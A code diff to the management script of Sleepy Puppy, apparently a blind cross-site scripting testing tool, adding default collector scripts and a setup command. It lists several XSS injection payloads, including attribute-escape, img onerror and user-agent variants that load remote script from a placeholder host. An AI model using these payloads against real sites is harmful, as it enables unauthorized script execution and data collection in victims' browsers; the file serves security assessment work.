@@ -7,6 +7,7 @@ from flask.ext.script import Manager
 from flask.ext.migrate import Migrate, MigrateCommand
 from sleepypuppy.admin.admin.models import Administrator
 from sleepypuppy import app, db
+from js_strings import default_script, alert_box, console_log, default_without_screenshot, generic_collector
 
 manager = Manager(app)
 migrate = Migrate(app, db)
@@ -81,15 +82,33 @@ def default_login():
 
 
 from collections import namedtuple
-DefaultPayload = namedtuple('DefaultPayload', ['payload', 'url', 'method', 'parameter', 'notes'])
+DefaultPayload = namedtuple(
+    'DefaultPayload', ['payload', 'url', 'method', 'parameter', 'notes'])
 DEFAULT_PAYLOADS = [
     DefaultPayload('<script src=$1></script>', None, 'GET', None, 'Generic'),
     DefaultPayload('</script><script src=$1>', None, 'GET', None, 'Reversed'),
-    DefaultPayload('&lt;script src=$1&gt;&lt;/script&gt;', None, 'GET', None, 'Generic Encoded'),
-    DefaultPayload('&lt;/script&gt;&lt;script src=$1&gt;', None, 'GET', None, 'Generic Reversed'),
+    DefaultPayload(
+        '&lt;script src=$1&gt;&lt;/script&gt;', None, 'GET', None, 'Generic Encoded'),
+    DefaultPayload('&lt;/script&gt;&lt;script src=$1&gt;',
+                   None, 'GET', None, 'Generic Reversed'),
     DefaultPayload('''" onload="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);" garbage="''', None, 'GET', None, 'DOM Attribute Escape'),  # noqa
     DefaultPayload("""'"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, 'GET', None, 'For where "<script" is banned'),  # noqa
     DefaultPayload("""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 '"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, 'GET', None, 'Promiscuous User Agent')  # noqa
+]
+
+DefaultJavascript = namedtuple('DefaultJavascript', ['name', 'code', 'notes'])
+
+DEFAULT_JAVASCRIPTS = [
+    DefaultJavascript('Default', default_script,
+                      'Default  collects metadata for capture table including a screenshot'),
+    DefaultJavascript('Default Without Screenshot', default_without_screenshot,
+                      'Generating a screenshot can be CPU intensive and even in some cases cause browser instability, so for some assessments this may be a better option. '),
+    DefaultJavascript(
+        'Alert Box', alert_box, 'Generates an alert box for notification purposes'),
+    DefaultJavascript(
+        'Console Log', console_log, 'Log a message in the browser\'s console'),
+    DefaultJavascript('Generic Collector: IP Address', generic_collector,
+                      'Example showing how you can create generic JavaScripts for collecting any text data you choose.  In this example we use ajax to determine IP address and record the value. ')
 ]
 
 
@@ -100,6 +119,8 @@ def create_bootstrap_assessment(name="General", add_default_payloads=True):
     """
     from sleepypuppy.admin.assessment.models import Assessment
     from sleepypuppy.admin.payload.models import Payload
+    from sleepypuppy.admin.javascript.models import Javascript
+
     assessment = Assessment.query.filter(Assessment.name == name).first()
     if assessment:
         print("Assessment with name", name, "already exists.")
@@ -114,12 +135,29 @@ def create_bootstrap_assessment(name="General", add_default_payloads=True):
                 method=payload.method,
                 parameter=payload.parameter,
                 notes=payload.notes,
+                ordering=u'1',
                 snooze=False,
                 run_once=False
             )
             assessment.payloads.append(payload)
     db.session.add(assessment)
     db.session.commit()
+
+    for javascript in DEFAULT_JAVASCRIPTS:
+        javascript = Javascript(
+            name=javascript.name,
+            code=javascript.code,
+            notes=javascript.notes
+        )
+        db.session.add(javascript)
+    db.session.commit()
+
+
+@manager.command
+def setup_sleepy_puppy():
+    create_db()
+    default_login()
+    create_bootstrap_assessment()
 
 
 @manager.command
